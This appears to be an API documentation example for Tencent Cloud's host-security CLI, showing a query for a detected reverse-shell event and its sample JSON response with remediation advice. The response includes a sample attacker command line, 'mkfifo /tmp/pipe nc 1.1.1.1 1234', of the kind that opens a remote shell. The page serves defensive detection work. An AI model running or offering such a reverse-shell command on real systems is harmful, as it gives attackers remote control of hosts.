**Example 1: 查询反弹shell详情**



Input: 

```
tccli cwp DescribeReverseShellEventInfo --cli-unfold-argument  \
    --Id 12
```

Output: 
```
{
    "Response": {
        "ReverseShellEventInfo": {
            "Id": 10001,
            "Uuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
            "Quuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
            "HostIp": "1.1.1.1",
            "DstIp": "10.0.1.92",
            "DstPort": 0,
            "ProcessName": "mkfifo",
            "FullPath": "/usr/bin/mkfifo",
            "CmdLine": "mkfifo /tmp/pipe nc 1.1.1.1 1234",
            "UserName": "0",
            "UserGroup": "0",
            "ParentProcName": "nginx",
            "ParentProcUser": "0",
            "ParentProcGroup": "root",
            "ParentProcPath": "nginx",
            "PsTree": "[{\"pid\":\"1\"}]",
            "Status": 0,
            "CreateTime": "2024-09-27 15:43:56",
            "ModifyTime": "2024-09-27 15:44:32",
            "MachineName": "机器名称",
            "DetectBy": 1,
            "MachineWanIp": "1.1.1.1",
            "SuggestScheme": "1、检查系统是否存在异常的网络连接；\n2、隔离或者删除相关的木马文件；xa0\n3、对系统进行风险排查，并进行安全加固，详情可参考如下链接：xa0\n【Linux】https://cloud.tencent.com/document/product/296/9604xa0\n【Windows】https://cloud.tencent.com/document/product/296/9605",
            "HarmDescribe": "黑客在入侵服务器后，为了进行下一步的恶意操作，会让受害主机创建一个交互式shell并连接黑客的远程控制服务器，黑客通过建立的通道，可以向受害主机发送指令并获得执行结果。",
            "Tags": [],
            "References": [],
            "MachineStatus": "ONLINE"
        },
        "RequestId": "db8fd5e1-6d57-405b-9f57-9d6d0589bdc8"
    }
}
```

